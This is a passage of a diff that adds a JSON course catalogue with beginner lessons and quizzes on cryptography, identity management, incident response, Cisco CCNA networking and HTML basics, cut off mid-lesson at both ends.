+        "reading": "<h3>Securing Data with Math</h3>\n<p>Cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior. More generally, cryptography is about constructing and analyzing protocols that prevent third parties or the public from reading private messages.</p>\n<h3>Key Cryptographic Concepts</h3>\n<ul>\n    <li><b>Encryption:</b> The process of encoding a message or information in such a way that only authorized parties can access it.</li>\n    <li><b>Decryption:</b> The process of converting encrypted data back into its original form.</li>\n    <li><b>Cipher:</b> An algorithm for performing encryption or decryption.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: Cryptography provides confidentiality, integrity, non-repudiation, and authentication.</div>\n<p>Modern cryptography intersects the disciplines of mathematics, computer science, and electrical engineering.</p>",
+        "quiz": [
+          {
+            "q": "What is the process of converting encrypted data back into its original form called?",
+            "opts": [
+              "Encryption",
+              "Decryption",
+              "Hashing"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "4.2 Symmetric vs Asymmetric Encryption",
+        "vid": "AQDCe585Lnc",
+        "reading": "<h3>Two Approaches to Encryption</h3>\n<p>There are two primary types of encryption used today: symmetric and asymmetric.</p>\n<h3>Symmetric Encryption</h3>\n<p>Symmetric encryption uses a single key to both encrypt and decrypt data. Both the sender and the receiver must have the same key.</p>\n<ul>\n    <li><b>Pros:</b> Fast, efficient for large amounts of data.</li>\n    <li><b>Cons:</b> Key distribution is a major challenge.</li>\n    <li><b>Examples:</b> AES, DES.</li>\n</ul>\n<h3>Asymmetric Encryption</h3>\n<p>Asymmetric encryption uses a pair of keys: a public key for encryption and a private key for decryption.</p>\n<ul>\n    <li><b>Pros:</b> Solves the key distribution problem.</li>\n    <li><b>Cons:</b> Slower, computationally expensive.</li>\n    <li><b>Examples:</b> RSA, ECC.</li>\n</ul>\n<div class='note-box'>\ud83d\udca1 Note: In practice, systems often use a hybrid approach, using asymmetric encryption to securely exchange a symmetric key, which is then used for the bulk of data transfer.</div>",
+        "quiz": [
+          {
+            "q": "Which type of encryption uses a pair of keys (public and private)?",
+            "opts": [
+              "Symmetric Encryption",
+              "Asymmetric Encryption",
+              "Hashing"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "5.1 Identity and Access Management",
+        "vid": "P3nSj-yFDEs",
+        "reading": "<h3>Controlling Who Has Access</h3>\n<p>Identity and Access Management (IAM) ensures that the right people and job roles in your organization can access the tools they need to do their jobs.</p>\n<h3>The Core Principles of IAM</h3>\n<ul>\n    <li><b>Identification:</b> Claiming an identity (e.g., username).</li>\n    <li><b>Authentication:</b> Proving the identity (e.g., password).</li>\n    <li><b>Authorization:</b> Granting access based on the proven identity (e.g., permissions).</li>\n</ul>\n<p>Effective IAM systems allow IT administrators to securely manage identities and control access to corporate resources.</p>\n<div class='note-box'>\ud83d\udca1 Note: The Principle of Least Privilege states that a user should only be given the minimum levels of access necessary to complete their job functions.</div>",
+        "quiz": [
+          {
+            "q": "What does the Principle of Least Privilege state?",
+            "opts": [
+              "All users should have admin access",
+              "Users should only have the minimum access necessary",
+              "Users should change passwords daily"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 10,
+        "title": "5.2 Passwords and Multi-Factor Authentication",
+        "vid": "5OwwyP_A2Wk",
+        "reading": "<h3>Strengthening Authentication</h3>\n<p>Passwords have historically been the primary method of authentication, but they are increasingly vulnerable to brute-force attacks, credential stuffing, and phishing.</p>\n<h3>Multi-Factor Authentication (MFA)</h3>\n<p>MFA requires users to provide two or more verification factors to gain access to a resource such as an application, online account, or a VPN. This adds an extra layer of security.</p>\n<ul>\n    <li><b>Something you know:</b> A password or PIN.</li>\n    <li><b>Something you have:</b> A smartphone, hardware token, or smart card.</li>\n    <li><b>Something you are:</b> Biometrics like fingerprints or facial recognition.</li>\n</ul>\n<div class='code-block'>\n# Concept of MFA verification\ndef verify_login(user, password, otp):\n    if check_password(user, password) and check_otp(user, otp):\n        return \"Access Granted\"\n    return \"Access Denied\"\n</div>\n<div class='note-box'>\ud83d\udca1 Note: Implementing MFA is one of the most effective ways to prevent unauthorized access, even if a password is compromised.</div>",
+        "quiz": [
+          {
+            "q": "Which of the following represents 'something you have' in MFA?",
+            "opts": [
+              "A password",
+              "A smartphone or hardware token",
+              "A fingerprint"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 11,
+        "title": "6.1 Incident Response and Forensics",
+        "vid": "gR_U8Kx8o4U",
+        "reading": "<h3>Reacting to an Attack</h3>\n<p>An Incident Response (IR) plan is a set of instructions designed to help IT staff detect, respond to, and recover from network security incidents. The goal is to address and manage the aftermath of a security breach or cyberattack.</p>\n<h3>Phases of Incident Response</h3>\n<ol>\n    <li><b>Preparation:</b> Establishing policies, procedures, and tools.</li>\n    <li><b>Identification:</b> Detecting the incident and determining its scope.</li>\n    <li><b>Containment:</b> Stopping the spread of the threat.</li>\n    <li><b>Eradication:</b> Removing the threat from the environment.</li>\n    <li><b>Recovery:</b> Restoring systems to normal operation.</li>\n    <li><b>Lessons Learned:</b> Analyzing the incident to improve future responses.</li>\n</ol>\n<h3>Digital Forensics</h3>\n<p>Digital forensics is the process of uncovering and interpreting electronic data. The goal is to preserve any evidence in its most original form while performing a structured investigation to reconstruct past events.</p>\n<div class='note-box'>\ud83d\udca1 Note: Always follow a documented chain of custody when handling digital evidence to ensure it remains admissible in court.</div>",
+        "quiz": [
+          {
+            "q": "What is the first phase of an Incident Response plan?",
+            "opts": [
+              "Identification",
+              "Containment",
+              "Preparation"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 12,
+        "title": "6.2 The Future of Cybersecurity",
+        "vid": "Q6i3B2x7Bjc",
+        "reading": "<h3>Looking Ahead</h3>\n<p>The cybersecurity landscape is constantly evolving as new technologies emerge and attackers develop new techniques. Staying ahead of threats requires continuous learning and adaptation.</p>\n<h3>Emerging Trends</h3>\n<ul>\n    <li><b>Artificial Intelligence & Machine Learning:</b> Used both by defenders to detect anomalies and by attackers to automate and scale attacks.</li>\n    <li><b>Quantum Computing:</b> Poses a future threat to current cryptographic algorithms, driving the need for post-quantum cryptography.</li>\n    <li><b>Internet of Things (IoT):</b> The proliferation of connected devices vastly expands the attack surface.</li>\n</ul>\n<p>As we move into the future, a proactive, intelligence-driven approach to cybersecurity will become increasingly critical.</p>\n<div class='note-box'>\ud83d\udca1 Note: Continuous education and adopting a 'security-first' mindset are essential for individuals and organizations alike.</div>",
+        "quiz": [
+          {
+            "q": "How is AI impacting cybersecurity?",
+            "opts": [
+              "It is only used by defenders",
+              "It is only used by attackers",
+              "It is used by both defenders and attackers"
+            ],
+            "ans": 2
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "cat": "NETWORKING",
+    "title": "Cisco CCNA 200-301 \u2014 Networking Course",
+    "desc": "Learn IP addressing, IPv4/IPv6 subnetting, VLANs, routing protocols (OSPF), and Cisco IOS commands.",
+    "vid": "H8W9oMNSuwo",
+    "level": "INTERMEDIATE",
+    "bdg": "bdg-b",
+    "lessonsCount": 12,
+    "hrs": "12h",
+    "source": "Jeremy's IT Lab (YouTube)",
+    "rating": "\u2b50 5.0 (3,100 reviews)",
+    "outcomes": [
+      "Understand OSI 7-Layer Model and TCP/IP stack",
+      "Master IPv4 subnetting and CIDR notation",
+      "Configure Cisco routers and switches via IOS CLI"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "1.1 Network Components",
+        "vid": "qiQR5rCEvnI",
+        "reading": "<h3>What is a Computer Network?</h3><p>At its core, a computer network is a group of interconnected nodes or computing devices that exchange data and resources with each other. A network connection can be established using either cable media or wireless media.</p><h3>Primary Components of a Network</h3><p>Every network, from a small home setup to the global Internet, relies on three main categories of components:</p><ul><li><strong>End Devices:</strong> These are the devices that users directly interact with. Examples include desktop computers, laptops, servers, smartphones, and IoT devices.</li><li><strong>Intermediary Devices:</strong> These devices connect the end devices to the network and route data behind the scenes. Examples include switches, routers, and firewalls.</li><li><strong>Network Media:</strong> The physical or wireless channels through which data travels, such as copper cables, fiber optics, and Wi-Fi.</li></ul><div class='note-box'>\ud83d\udca1 Note: End devices are where the communication originates from or is directed to, while intermediary devices manage the flow of that communication.</div><h3>Why Learn Networking?</h3><p>Understanding these basic components is your very first step in the Cisco CCNA journey. As a network engineer, you will be responsible for configuring these intermediary devices to ensure data flows efficiently and securely.</p><div class='code-block'># A basic command to check interface status on a Cisco Router<br>Router# show ip interface brief</div>",
+        "quiz": [
+          {
+            "q": "Which of the following is considered an intermediary device?",
+            "opts": [
+              "Laptop",
+              "Switch",
+              "Server"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "1.2 Network Topologies",
+        "vid": "Pkwc-g45gXU",
+        "reading": "<h3>Understanding Network Types</h3><p>Networks are typically classified by their size and the geographic area they cover.</p><ul><li><strong>LAN (Local Area Network):</strong> Covers a small geographical area, such as a single office building or home. LANs are typically owned and managed by a single individual or IT department.</li><li><strong>WAN (Wide Area Network):</strong> Covers a large geographical area, such as across a city, country, or globally (e.g., the Internet). WANs are typically managed by Service Providers.</li><li><strong>WLAN (Wireless LAN):</strong> A LAN that wirelessly interconnects users and endpoints.</li></ul><h3>Network Topologies</h3><p>The term 'topology' refers to the layout or structure of a network.</p><p><strong>Physical Topology:</strong> Refers to the physical layout of the wires and devices. Common examples include Star, Bus, and Ring. Modern LANs almost exclusively use the Star topology.</p><p><strong>Logical Topology:</strong> Refers to the way a network transfers frames from one node to the next.</p><div class='note-box'>\ud83d\udca1 Note: When troubleshooting a network, you must understand both its physical wiring and its logical data flow.</div>",
+        "quiz": [
+          {
+            "q": "Which topology is most commonly used in modern LANs?",
+            "opts": [
+              "Bus",
+              "Ring",
+              "Star"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "2.1 The OSI Model",
+        "vid": "vv4y_uOneC0",
+        "reading": "<h3>The OSI Reference Model</h3><p>The Open Systems Interconnection (OSI) model is a conceptual framework used to understand and standardize how different network protocols and equipment communicate. It divides the network communication process into seven distinct layers:</p><ul><li><strong>Layer 7 - Application:</strong> The interface to the user and network applications.</li><li><strong>Layer 6 - Presentation:</strong> Data formatting, encryption, and compression.</li><li><strong>Layer 5 - Session:</strong> Establishes, maintains, and terminates sessions.</li><li><strong>Layer 4 - Transport:</strong> End-to-end data delivery, error recovery, and flow control (TCP, UDP).</li><li><strong>Layer 3 - Network:</strong> Logical addressing (IP addresses) and routing data.</li><li><strong>Layer 2 - Data Link:</strong> Physical addressing (MAC addresses) and access to the media.</li><li><strong>Layer 1 - Physical:</strong> The physical media and binary transmission (1s and 0s).</li></ul><div class='note-box'>\ud83d\udca1 Note: A common mnemonic to remember the layers from bottom to top is 'Please Do Not Throw Sausage Pizza Away'.</div><h3>The TCP/IP Model</h3><p>The TCP/IP model closely aligns with the actual protocols that run the Internet today. It condenses the 7 OSI layers into 4 layers: Application, Transport, Internet, and Network Access.</p>",
+        "quiz": [
+          {
+            "q": "Which OSI layer is responsible for logical addressing (IP)?",
+            "opts": [
+              "Data Link",
+              "Network",
+              "Transport"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "3.1 IPv4 Addressing",
+        "vid": "vcFT6Xq5mCg",
+        "reading": "<h3>IPv4 Addressing Basics</h3><p>An IPv4 address is a 32-bit logical address that uniquely identifies a device on a network. It is typically represented in dotted-decimal format, divided into four 8-bit sections called octets (e.g., 192.168.1.10).</p><h3>The Subnet Mask</h3><p>Every IP address consists of two parts: a Network portion and a Host portion. The subnet mask is used by devices to determine which part is which. For example, a subnet mask of 255.255.255.0 means the first three octets are the network address.</p><h3>Subnetting</h3><p>Subnetting is the process of borrowing bits from the host portion of an address to create smaller sub-networks (subnets). This helps conserve IP addresses and improves network performance.</p><div class='code-block'>IP Address: 192.168.1.50<br>Subnet Mask: 255.255.255.0 (/24)<br>Network Address: 192.168.1.0<br>Broadcast Address: 192.168.1.255</div><div class='note-box'>\ud83d\udca1 Note: The /24 notation is called CIDR (Classless Inter-Domain Routing) notation and represents the number of consecutive 1s in the subnet mask.</div>",
+        "quiz": [
+          {
+            "q": "How many bits are in an IPv4 address?",
+            "opts": [
+              "128 bits",
+              "32 bits",
+              "64 bits"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "3.2 IPv6 Addressing",
+        "vid": "8n8hVw5_sLE",
+        "reading": "<h3>The Need for IPv6</h3><p>The primary motivation for transitioning to IPv6 is the exhaustion of the IPv4 address space. While IPv4 offers roughly 4.3 billion addresses, IPv6 provides a staggering 340 undecillion addresses (a 128-bit address space).</p><h3>IPv6 Address Format</h3><p>IPv6 addresses are 128 bits in length and are written in hexadecimal characters. The address is divided into eight 16-bit segments, called hextets, separated by colons.</p><div class='code-block'>Example: 2001:0db8:85a3:0000:0000:8a2e:0370:7334</div><h3>Compressing IPv6 Addresses</h3><p>To make IPv6 addresses easier to read and write, there are two main rules for compression:</p><ol><li><strong>Omit Leading Zeros:</strong> Within any hextet, leading zeros can be removed. For example, '0db8' becomes 'db8'.</li><li><strong>Double Colon (::):</strong> A single contiguous block of multiple hextets consisting only of zeros can be replaced with a double colon (::). This can only be used once per address.</li></ol><div class='note-box'>\ud83d\udca1 Note: Applying both rules, our example address can be compressed to: 2001:db8:85a3::8a2e:370:7334</div>",
+        "quiz": [
+          {
+            "q": "What is the length of an IPv6 address?",
+            "opts": [
+              "32 bits",
+              "128 bits",
+              "64 bits"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "4.1 Ethernet Switching",
+        "vid": "oP01F_RIfa4",
+        "reading": "<h3>Fundamentals of Ethernet Switching</h3><p>Switches operate at Layer 2 (the Data Link Layer) of the OSI model. Their primary job is to connect end devices on a local network and forward Ethernet frames based on MAC (Media Access Control) addresses.</p><h3>The MAC Address Table</h3><p>A switch learns the topology of the network by examining the source MAC address of every incoming frame and associating that MAC address with the switch port it arrived on. This information is stored in the MAC Address Table.</p><div class='code-block'>Switch# show mac address-table<br>          Mac Address Table<br>-------------------------------------------<br>Vlan    Mac Address       Type        Ports<br>----    -----------       --------    -----<br>   1    000a.f312.4411    DYNAMIC     Fa0/1</div><h3>Frame Forwarding</h3><p>When a switch receives a frame destined for a specific device, it looks up the destination MAC address in its table and forwards the frame out of the correct port.</p><div class='note-box'>\ud83d\udca1 Note: If the switch does not know the destination MAC, it floods the frame out of all ports except the receiving port.</div>",
+        "quiz": [
+          {
+            "q": "What does a Layer 2 switch use to make forwarding decisions?",
+            "opts": [
+              "IP Addresses",
+              "MAC Addresses",
+              "Port Numbers"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "4.2 VLAN Concepts",
+        "vid": "jF537KjV4Ew",
+        "reading": "<h3>What is a VLAN?</h3><p>A Virtual LAN (VLAN) allows you to logically segment a network into different broadcast domains on the same physical switch. Without VLANs, a broadcast sent by one device is received by all other devices on the switch.</p><h3>Benefits of VLANs</h3><ul><li><strong>Security:</strong> Separating sensitive data from the rest of the network.</li><li><strong>Cost Reduction:</strong> Less need for expensive physical routers to create separate networks.</li><li><strong>Better Performance:</strong> Smaller broadcast domains reduce unnecessary traffic.</li></ul><div class='code-block'>Switch(config)# vlan 10<br>Switch(config-vlan)# name Sales<br>Switch(config-vlan)# exit<br>Switch(config)# interface FastEthernet 0/1<br>Switch(config-if)# switchport mode access<br>Switch(config-if)# switchport access vlan 10</div><div class='note-box'>\ud83d\udca1 Note: By default, all ports on a Cisco switch belong to VLAN 1 (the default VLAN).</div>",
+        "quiz": [
+          {
+            "q": "What is the primary purpose of a VLAN?",
+            "opts": [
+              "To speed up routing",
+              "To logically segment a network",
+              "To connect to the internet"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "5.1 Routing Concepts",
+        "vid": "u5QYmB_81eE",
+        "reading": "<h3>The Role of a Router</h3><p>Routers operate at Layer 3 (Network Layer) and are designed to connect different networks together. Unlike switches, which connect devices within the same network, routers figure out how to send packets to remote networks.</p><h3>The Routing Table</h3><p>To make forwarding decisions, a router uses a Routing Table. This table contains a list of destination networks and the best path to reach them.</p><div class='code-block'>Router# show ip route<br>C   192.168.1.0/24 is directly connected, GigabitEthernet0/0<br>S   10.0.0.0/8 [1/0] via 192.168.1.2</div><p>When a router receives a packet, it examines the destination IP address, finds the most specific match in its routing table, and forwards the packet out the associated interface.</p><div class='note-box'>\ud83d\udca1 Note: The 'Default Gateway' configured on your PC is simply the IP address of your local router. It's the doorway out of your local network.</div>",
+        "quiz": [
+          {
+            "q": "What table does a router use to make forwarding decisions?",
+            "opts": [
+              "MAC Address Table",
+              "ARP Table",
+              "Routing Table"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "5.2 Static vs Dynamic Routing",
+        "vid": "9x8-11xL1iQ",
+        "reading": "<h3>Static Routing</h3><p>A static route is manually configured by a network administrator. It tells the router exactly where to send traffic for a specific destination. Static routes are secure and use very little CPU memory, but they do not automatically adapt if a link goes down.</p><div class='code-block'>Router(config)# ip route 192.168.2.0 255.255.255.0 10.0.0.2</div><h3>Dynamic Routing</h3><p>Dynamic routing protocols (such as OSPF, EIGRP, and BGP) allow routers to dynamically share information about the networks they know. If a topology changes, the routers automatically update their routing tables to find a new path.</p><h3>Administrative Distance (AD)</h3><p>When a router learns about the same destination network from multiple sources, it uses Administrative Distance to choose the most trusted source. Lower AD is better.</p><div class='note-box'>\ud83d\udca1 Note: Static routes have a default Administrative Distance of 1, meaning they are almost always preferred over dynamic routing protocols.</div>",
+        "quiz": [
+          {
+            "q": "What is the default Administrative Distance of a static route?",
+            "opts": [
+              "90",
+              "1",
+              "120"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "5.3 Introduction to OSPF",
+        "vid": "TQ3d0g-D_kU",
+        "reading": "<h3>What is OSPF?</h3><p>OSPF (Open Shortest Path First) is a highly popular, open-standard Link-State routing protocol. It is used extensively in enterprise networks.</p><h3>How OSPF Works</h3><p>OSPF routers establish 'neighbor' relationships with directly connected routers. They then exchange Link-State Advertisements (LSAs) to build a complete topological map of the network. Finally, each router runs the Dijkstra algorithm to determine the absolute shortest path to every destination network.</p><ul><li><strong>Metric:</strong> OSPF uses 'Cost' as its metric, which is inversely proportional to the bandwidth of the link. Higher bandwidth = lower cost = better path.</li><li><strong>Administrative Distance:</strong> OSPF has a default AD of 110.</li><li><strong>Areas:</strong> OSPF uses a hierarchical design with Areas to minimize routing update traffic. Area 0 is the backbone.</li></ul><div class='code-block'>Router(config)# router ospf 1<br>Router(config-router)# network 192.168.1.0 0.0.0.255 area 0</div><div class='note-box'>\ud83d\udca1 Note: OSPF configuration uses wildcard masks (like 0.0.0.255) instead of standard subnet masks.</div>",
+        "quiz": [
+          {
+            "q": "What metric does OSPF use to determine the best path?",
+            "opts": [
+              "Hop count",
+              "Delay",
+              "Cost (Based on Bandwidth)"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 10,
+        "title": "6.1 Network Address Translation (NAT)",
+        "vid": "gX4UeW5IqH0",
+        "reading": "<h3>Why Do We Need NAT?</h3><p>Private IPv4 addresses (like 192.168.x.x or 10.x.x.x) are not allowed to be routed over the public Internet. NAT (Network Address Translation) was created to translate these private addresses into globally unique public IP addresses.</p><h3>Types of NAT</h3><ul><li><strong>Static NAT:</strong> A strict one-to-one mapping between a private IP and a public IP. Useful for web servers that need a consistent public address.</li><li><strong>Dynamic NAT:</strong> Translates private IPs to public IPs from a shared pool.</li><li><strong>PAT (Port Address Translation):</strong> Also known as NAT Overload. This translates many private IPs to a single public IP address by keeping track of unique source port numbers.</li></ul><div class='note-box'>\ud83d\udca1 Note: PAT is the most common form of NAT today. It is what your home wireless router uses to allow all your devices to share one public IP from your ISP.</div>",
+        "quiz": [
+          {
+            "q": "Which type of NAT translates multiple private IPs to a single public IP using port numbers?",
+            "opts": [
+              "Static NAT",
+              "Dynamic NAT",
+              "PAT (NAT Overload)"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 11,
+        "title": "7.1 Access Control Lists (ACLs)",
+        "vid": "r8oN3a-7WcI",
+        "reading": "<h3>What are Access Control Lists?</h3><p>ACLs are a set of rules defined on a router or firewall to filter incoming or outgoing network traffic. They act like a bouncer at a club, checking packets against a list of criteria to decide whether to permit or deny them.</p><h3>Standard vs Extended ACLs</h3><ul><li><strong>Standard ACLs (Numbered 1-99):</strong> These can only filter traffic based on the Source IP Address. They are typically placed as close to the destination as possible.</li><li><strong>Extended ACLs (Numbered 100-199):</strong> Much more granular. They can filter based on Source IP, Destination IP, Protocol (TCP/UDP), and Port Numbers (like port 80 for HTTP). They are typically placed as close to the source as possible.</li></ul><div class='code-block'>Router(config)# access-list 10 permit 192.168.1.0 0.0.0.255<br>Router(config)# interface GigabitEthernet0/0<br>Router(config-if)# ip access-group 10 in</div><div class='note-box'>\ud83d\udca1 Note: Every ACL has an implicit 'deny all' statement at the very end. If a packet does not match any of your explicit rules, it will be automatically dropped!</div>",
+        "quiz": [
+          {
+            "q": "What do Standard ACLs filter traffic based on?",
+            "opts": [
+              "Destination IP only",
+              "Source IP only",
+              "Both Source IP and Port numbers"
+            ],
+            "ans": 1
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "cat": "WEB DEVELOPMENT",
+    "title": "HTML & CSS \u2014 Modern Web Design",
+    "desc": "Build responsive websites using semantic HTML5, CSS Grid, Flexbox, and modern CSS variables.",
+    "vid": "mU6anWqZJcc",
+    "level": "BEGINNER",
+    "bdg": "bdg-g",
+    "lessonsCount": 12,
+    "hrs": "5h",
+    "source": "Dave Gray (YouTube)",
+    "rating": "\u2b50 4.9 (1,500 reviews)",
+    "outcomes": [
+      "Build structured web pages using HTML5 elements",
+      "Style layouts with Flexbox and CSS Grid",
+      "Create mobile-responsive web applications"
+    ],
+    "lessons": [
+      {
+        "id": 0,
+        "title": "1. HTML Basics and Document Structure",
+        "vid": "pQN-pnXPaVg",
+        "reading": "<h3>What is HTML?</h3><p>HTML stands for Hyper Text Markup Language. It is the standard markup language for creating Web pages. HTML elements are the building blocks of HTML pages.</p><div class='note-box'>\ud83d\udca1 Note: HTML describes the structure of a Web page semantically.</div><h3>A Simple HTML Document</h3><div class='code-block'>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;Page Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n  &lt;h1&gt;My First Heading&lt;/h1&gt;\n  &lt;p&gt;My first paragraph.&lt;/p&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;</div><h3>Explanation of the Example</h3><ul><li><strong>&lt;!DOCTYPE html&gt;</strong>: Defines that this document is an HTML5 document.</li><li><strong>&lt;html&gt;</strong>: The root element of an HTML page.</li><li><strong>&lt;head&gt;</strong>: Contains meta information about the page.</li><li><strong>&lt;title&gt;</strong>: Specifies a title for the page, shown in the browser's title bar or page tab.</li><li><strong>&lt;body&gt;</strong>: Defines the document's body, a container for all visible contents.</li></ul>",
+        "quiz": [
+          {
+            "q": "What does HTML stand for?",
+            "opts": [
+              "Home Tool Markup Language",
+              "Hyper Text Markup Language",
+              "Hyperlinks and Text Markup Language"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which element represents the root of an HTML document?",
+            "opts": [
+              "<head>",
+              "<body>",
+              "<html>"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Where does the <title> element go?",
+            "opts": [
+              "Inside <head>",
+              "Inside <body>",
+              "At the very top"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 1,
+        "title": "2. HTML Elements, Attributes, and Headings",
+        "vid": "kUMe1ly46mA",
+        "reading": "<h3>HTML Elements</h3><p>An HTML element is defined by a start tag, some content, and an end tag: <code>&lt;tagname&gt;Content goes here...&lt;/tagname&gt;</code></p><p>Nested HTML Elements: Elements can contain other elements. All HTML documents consist of nested HTML elements.</p><h3>HTML Attributes</h3><p>Attributes provide additional information about HTML elements. They are always specified in the start tag and usually come in name/value pairs like: <code>name=\"value\"</code>.</p><div class='note-box'>\ud83d\udca1 Note: Always quote attribute values. Double quotes are the most common.</div><h3>HTML Headings</h3><p>HTML headings are defined with the <code>&lt;h1&gt;</code> to <code>&lt;h6&gt;</code> tags. <code>&lt;h1&gt;</code> defines the most important heading, while <code>&lt;h6&gt;</code> defines the least important.</p><div class='code-block'>&lt;h1&gt;Heading 1&lt;/h1&gt;\n&lt;h2&gt;Heading 2&lt;/h2&gt;\n&lt;h3&gt;Heading 3&lt;/h3&gt;</div>",
+        "quiz": [
+          {
+            "q": "Which tag defines the most important heading?",
+            "opts": [
+              "<h6>",
+              "<heading>",
+              "<h1>"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Where are attributes placed in an HTML element?",
+            "opts": [
+              "In the start tag",
+              "In the end tag",
+              "Between the tags"
+            ],
+            "ans": 0
+          },
+          {
+            "q": "What format do attributes typically follow?",
+            "opts": [
+              "value=\"name\"",
+              "name=\"value\"",
+              "attribute:value"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 2,
+        "title": "3. HTML Links and Images",
+        "vid": "bWPMSSsVdPk",
+        "reading": "<h3>HTML Links</h3><p>HTML links are hyper-links. You can click on a link and jump to another document.</p><p>Links are defined with the <code>&lt;a&gt;</code> tag:</p><div class='code-block'>&lt;a href=\"https://www.w3schools.com/\"&gt;Visit W3Schools.com!&lt;/a&gt;</div><p>The <code>href</code> attribute specifies the destination address of the link.</p><h3>HTML Images</h3><p>Images are not technically inserted into a web page; images are linked to web pages. The <code>&lt;img&gt;</code> tag creates a holding space for the referenced image.</p><div class='code-block'>&lt;img src=\"img_girl.jpg\" alt=\"Girl in a jacket\" width=\"500\" height=\"600\"&gt;</div><div class='note-box'>\ud83d\udca1 Note: The alt attribute provides an alternate text for an image, if the user for some reason cannot view it (because of slow connection, an error in the src attribute, or if the user uses a screen reader).</div>",
+        "quiz": [
+          {
+            "q": "Which tag is used to create a hyperlink?",
+            "opts": [
+              "<link>",
+              "<a>",
+              "<href>"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "Which attribute specifies the URL of the link?",
+            "opts": [
+              "src",
+              "link",
+              "href"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Which attribute is used to provide alternate text for an image?",
+            "opts": [
+              "alt",
+              "title",
+              "text"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "4. HTML Lists and Tables",
+        "vid": "aMUDvNGsllE",
+        "reading": "<h3>HTML Lists</h3><p>HTML offers two primary types of lists: Unordered and Ordered.</p><ul><li><strong>Unordered List:</strong> Starts with the <code>&lt;ul&gt;</code> tag. Each list item starts with the <code>&lt;li&gt;</code> tag. By default, items are marked with bullets.</li><li><strong>Ordered List:</strong> Starts with the <code>&lt;ol&gt;</code> tag. Each list item starts with the <code>&lt;li&gt;</code> tag. By default, items are marked with numbers.</li></ul><div class='code-block'>&lt;ul&gt;\n  &lt;li&gt;Coffee&lt;/li&gt;\n  &lt;li&gt;Tea&lt;/li&gt;\n&lt;/ul&gt;</div><h3>HTML Tables</h3><p>An HTML table consists of one <code>&lt;table&gt;</code> element and one or more <code>&lt;tr&gt;</code>, <code>&lt;th&gt;</code>, and <code>&lt;td&gt;</code> elements.</p><div class='note-box'>\ud83d\udca1 Note: &lt;tr&gt; defines a table row, &lt;th&gt; defines a table header, and &lt;td&gt; defines a table data/cell.</div><div class='code-block'>&lt;table&gt;\n  &lt;tr&gt;\n    &lt;th&gt;Company&lt;/th&gt;\n    &lt;th&gt;Contact&lt;/th&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;Alfreds Futterkiste&lt;/td&gt;\n    &lt;td&gt;Maria Anders&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;</div>",
+        "quiz": [
+          {
+            "q": "Which tag defines an unordered list?",
+            "opts": [
+              "<list>",
+              "<ol>",
+              "<ul>"
+            ],
+            "ans": 2
+          },
+          {
+            "q": "Which tag is used for a table row?",
+            "opts": [
+              "<td>",
+              "<tr>",
+              "<th>"
+            ],
+            "ans": 1
+          },
+          {
+            "q": "What does <th> stand for?",
+            "opts": [
+              "Table Height",
+              "Table Header",
+              "Table Heading row"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "5. HTML Forms and Inputs",
+        "vid": "fNcJuPIZ2EQ",
+        "reading": "<h3>HTML Forms</h3><p>The <code>&lt;form&gt;</code> element is used to create an HTML form for user input. It acts as a container for different types of input elements, such as text fields, checkboxes, radio buttons, submit buttons, etc.</p><h3>The &lt;input&gt; Element</h3><p>The most used form element is the <code>&lt;input&gt;</code> element. It can be displayed in many ways, depending on the <code>type</code> attribute.</p><ul><li><code>&lt;input type=\"text\"&gt;</code> - Defines a single-line text input field</li><li><code>&lt;input type=\"radio\"&gt;</code> - Defines a radio button (for selecting one of many choices)</li><li><code>&lt;input type=\"submit\"&gt;</code> - Defines a submit button (for submitting the form)</li></ul><h3>The &lt;label&gt; Element</h3><div class='note-box'>\ud83d\udca1 Note: The <code>&lt;label&gt;</code> element is useful for screen-reader users. It also helps users who have difficulty clicking on very small regions (like radio buttons or checkboxes) because clicking on the text within the label toggles the radio button/checkbox.</div><div class='code-block'>&lt;form action=\"/submit\"&gt;\n  &lt;label for=\"fname\"&gt;First name:&lt;/label&gt;&lt;br&gt;\n  &lt;input type=\"text\" id=\"fname\" name=\"fname\"&gt;&lt;br&gt;\n  &lt;input 